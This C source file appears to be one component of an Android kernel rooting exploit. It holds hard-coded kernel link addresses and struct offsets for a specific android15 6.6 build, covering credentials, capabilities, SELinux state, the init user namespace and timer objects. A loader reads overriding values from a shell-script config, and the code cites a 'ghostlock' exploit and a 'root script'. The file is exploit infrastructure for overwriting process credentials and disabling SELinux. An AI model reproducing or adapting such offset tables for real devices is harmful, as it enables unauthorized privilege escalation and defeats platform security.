/*
 * kernel_offsets.c - 内核偏移表的默认值与运行期覆盖
 *
 * 默认值 = 原来 kernel_offsets.h 里写死的数值（6.6.118-android15-8 ... 4k）。
 * 运行期可用 --config <path.sh> 传入的 .sh 里那段 JSON 覆盖，
 * 逻辑照抄 ghostlock 的 target.c（LOAD_U32 / LOAD_U64 + flat_json_get_*_or）。
 *
 * 与 ghostlock 的差别只有两处：
 *   1) 键名取本文件的变量名（KO_*），另兼容 profile 风格的小写键；
 *   2) KO_PAGE_OFFSET 不从 JSON 读，加载完后由
 *        KO_PAGE_OFFSET = P0_PAGE_OFFSET - P0_PHYS_OFFSET
 *      重新算出来。
 */

#include <ctype.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "flat_json.h"
#include "kernel_offsets.h"
#include "patch_json.h"

/* ---- 线性映射基址 ---- */
uint64_t P0_PAGE_OFFSET = UINT64_C(0xFFFFFF8000000000);   /* -(1 << 39) */
uint64_t P0_PHYS_OFFSET = UINT64_C(0x80000000);           /* DRAM 起始物理地址 */
uint64_t KO_PAGE_OFFSET = UINT64_C(0xFFFFFF7F80000000);   /* 加载后按上两项重算 */

/* ---- 链接地址（link-time kernel addresses） ---- */
uint64_t KO_TIMER_LINK      = UINT64_C(0xFFFFFFC0801A4688);
uint64_t KO_CRED_LINK       = UINT64_C(0xFFFFFFC0800E3DC0);
uint64_t KO_SELINUX_LINK    = UINT64_C(0xFFFFFFC08237B220);
uint64_t KO_USER_NS         = UINT64_C(0xFFFFFFC08214F450);
uint64_t KO_ROOT_USER       = UINT64_C(0xFFFFFFC08214F6E0);
uint64_t KO_GROUPS          = UINT64_C(0xFFFFFFC082150C40);
uint64_t KO_UCOUNTS         = UINT64_C(0xFFFFFFC0821511B0);
uint64_t KO_TASK_ALLOC_LINK = UINT64_C(0xFFFFFFC0800AB858);

/* ---- task_struct / k_itimer 偏移 ---- */
uint32_t KO_TASK_CRED        = 0x820u;
uint32_t KO_TASK_STRUCT_SIZE = 0x12C0u;
uint32_t KO_CRED_UID         = 0x8u;
uint32_t KO_KITIMER_NODE     = 0x78u;
uint64_t KO_KITIMER_SIZE     = UINT64_C(0x108);

/* ---- struct cred 布局 ---- */
uint32_t KO_CRED_SIZE         = 0xB8u;
uint32_t KO_CRED_CAP_INH      = 0x30u;
uint32_t KO_CRED_CAP_PERM     = 0x38u;
uint32_t KO_CRED_CAP_EFF      = 0x40u;
uint32_t KO_CRED_CAP_BSET     = 0x48u;
uint32_t KO_CRED_CAP_AMB      = 0x50u;
uint32_t KO_CRED_OFF_SECURITY = 0x80u;
uint32_t KO_CRED_OFF_USER     = 0x88u;
uint32_t KO_CRED_OFF_USER_NS  = 0x90u;
uint32_t KO_CRED_OFF_UCOUNTS  = 0x98u;
uint32_t KO_CRED_OFF_GROUPS   = 0xA0u;

/* ---- nezha 方法（kprobe 读寄存器）专用常量 ---- */
uint32_t KO_TIMER_ALLOC_PROBE_OFF = 0;              /* 0 = 不启用 kprobe 法 */
uint64_t KO_TIMER_ALLOC_FETCH_REG = UINT64_C(0);    /* 读寄存器 x0 */
uint64_t KO_LINK_GETPID           = UINT64_C(0xffffffc0801022a8);

void kernel_offsets_recompute_page_offset(void)
{
    KO_PAGE_OFFSET = P0_PAGE_OFFSET - P0_PHYS_OFFSET;
}

/* 键名查找：先按变量名（KO_TIMER_LINK）找；找不到再按 profile 风格的小写键
 * （timer_link）找一次。两者都没有就返回 false，调用方保持默认值。 */
static bool ko_lookup_u64(const FlatJson *json, const char *name, uint64_t *out)
{
    if (flat_json_get_u64(json, name, out))
        return true;

    size_t len = strlen(name);
    char alias[64];
    if (len > 3 && strncmp(name, "KO_", 3) == 0 && len - 3 < sizeof(alias)) {
        size_t i;
        for (i = 3; i <= len; i++)   /* 含结尾 NUL */
            alias[i - 3] = (char)tolower((unsigned char)name[i]);
        return flat_json_get_u64(json, alias, out);
    }
    return false;
}

bool kernel_offsets_load_from_json(const char *json_text)
{
    FlatJson json;
    unsigned applied = 0;

    if (!json_text || !*json_text)
        return false;

    flat_json_init(&json);
    if (!flat_json_parse(&json, json_text, strlen(json_text))) {
        flat_json_destroy(&json);
        printf("[config] kernel_offsets: invalid JSON payload\n");
        return false;
    }

#define KO_LOAD_U32(name)                                                    \
    do {                                                                     \
        uint64_t value = 0;                                                  \
        if (ko_lookup_u64(&json, #name, &value)) {                           \
            if (value <= UINT64_C(0xFFFFFFFF)) {                             \
                name = (uint32_t)value;                                      \
                applied++;                                                   \
            } else {                                                         \
                printf("[config] %s out of u32 range, ignored\n", #name);    \
            }                                                                \
        }                                                                    \
    } while (0)

#define KO_LOAD_U64(name)                                                    \
    do {                                                                     \
        uint64_t value = 0;                                                  \
        if (ko_lookup_u64(&json, #name, &value)) {                           \
            name = value;                                                    \
            applied++;                                                       \
        }                                                                    \
    } while (0)

    /* 线性映射基址（KO_PAGE_OFFSET 由这两个推导，不直接读） */
    KO_LOAD_U64(P0_PAGE_OFFSET);
    KO_LOAD_U64(P0_PHYS_OFFSET);

    /* 链接地址 */
    KO_LOAD_U64(KO_TIMER_LINK);
    KO_LOAD_U64(KO_CRED_LINK);
    KO_LOAD_U64(KO_SELINUX_LINK);
    KO_LOAD_U64(KO_USER_NS);
    KO_LOAD_U64(KO_ROOT_USER);
    KO_LOAD_U64(KO_GROUPS);
    KO_LOAD_U64(KO_UCOUNTS);
    KO_LOAD_U64(KO_TASK_ALLOC_LINK);

    /* task_struct / k_itimer */
    KO_LOAD_U32(KO_TASK_CRED);
    KO_LOAD_U32(KO_TASK_STRUCT_SIZE);
    KO_LOAD_U32(KO_CRED_UID);
    KO_LOAD_U32(KO_KITIMER_NODE);
    KO_LOAD_U64(KO_KITIMER_SIZE);

    /* struct cred 布局 */
    KO_LOAD_U32(KO_CRED_SIZE);
    KO_LOAD_U32(KO_CRED_CAP_INH);
    KO_LOAD_U32(KO_CRED_CAP_PERM);
    KO_LOAD_U32(KO_CRED_CAP_EFF);
    KO_LOAD_U32(KO_CRED_CAP_BSET);
    KO_LOAD_U32(KO_CRED_CAP_AMB);
    KO_LOAD_U32(KO_CRED_OFF_SECURITY);
    KO_LOAD_U32(KO_CRED_OFF_USER);
    KO_LOAD_U32(KO_CRED_OFF_USER_NS);
    KO_LOAD_U32(KO_CRED_OFF_UCOUNTS);
    KO_LOAD_U32(KO_CRED_OFF_GROUPS);

    /* nezha / kprobe 法的数值项（文本项 KO_*_PROBE_NAME / FETCH_* 不读） */
    KO_LOAD_U32(KO_TIMER_ALLOC_PROBE_OFF);
    KO_LOAD_U64(KO_TIMER_ALLOC_FETCH_REG);
    KO_LOAD_U64(KO_LINK_GETPID);

#undef KO_LOAD_U32
#undef KO_LOAD_U64

    flat_json_destroy(&json);

    /* 两个 P0_* 可能刚被改过：__va(0) 必须跟着重算。 */
    kernel_offsets_recompute_page_offset();

    printf("[config] kernel_offsets: %u value(s) from JSON, page_offset=0x%llx\n", applied, (unsigned long long)KO_PAGE_OFFSET);
    return true;
}

bool kernel_offsets_load_from_sh(const char *sh_path) {
    if (g_patch_json[0] != '\0') {
        printf("[config] kernel_offsets: g_patch_json already set, skip reading %s\n", (sh_path && *sh_path) ? sh_path : "(none)");
        return kernel_offsets_load_from_json(g_patch_json);
    }

    if (!sh_path || !*sh_path) return false;
    if (!load_patch_json_from_file(sh_path, g_patch_json, sizeof(g_patch_json))) {
        printf("[config] kernel_offsets: no JSON payload in %s\n", sh_path);
        return false;
    }
    strncpy(g_root_script_path, sh_path, sizeof(g_root_script_path) - 1);
    g_root_script_path[sizeof(g_root_script_path) - 1] = '\0';

    printf("[config] kernel_offsets: JSON payload %zu bytes from %s\n", strlen(g_patch_json), sh_path);
    return kernel_offsets_load_from_json(g_patch_json);
}
